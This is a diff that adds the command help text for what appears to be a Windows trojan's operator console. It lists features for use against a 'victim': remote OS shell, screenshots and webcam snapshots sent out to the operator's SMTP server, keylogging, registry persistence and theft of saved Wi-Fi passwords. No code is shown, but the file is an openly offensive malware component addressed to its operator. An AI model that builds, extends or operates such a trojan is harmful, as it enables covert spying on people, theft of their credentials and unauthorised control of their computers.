@@ -1,0 +1,41 @@
+Some of the commands are require SMTP.If you want to use this commands, you need to configure
+your SMTP server with parameters.
+
+
+shell
+            Switches your terminal to OS shell terminal.With OS shell terminal,you can execute
+            OS commands and execute added arbitrary commands directly
+
+screenshot  (requires SMTP)
+            Takes screenshot from victim's computer and uploads to your SMTP server
+
+camera_snapshot (requires SMTP)
+            Takes camera snapshot from victim's camera and uploads to your SMTP server
+
+read_keys
+            Returns the keys pressed by the victim since the trojan was run
+
+get_keys (requires SMTP)
+            Like read_keys command, but uploads keylog file to your SMTP server
+
+persistence
+            Adds trojan to registry.With this, when the windows opened, trojan will executed
+
+remove_persistence
+            Removes persistence
+
+get_wifi
+            Returns saved wifi names and passwords from victim's computer
+
+system_info
+            Returns system info from victim's computer.
+
+clear
+            Clears the terminal
+
+help
+            Shows this message
+
+exit
+            Exits from program without losing connection
+
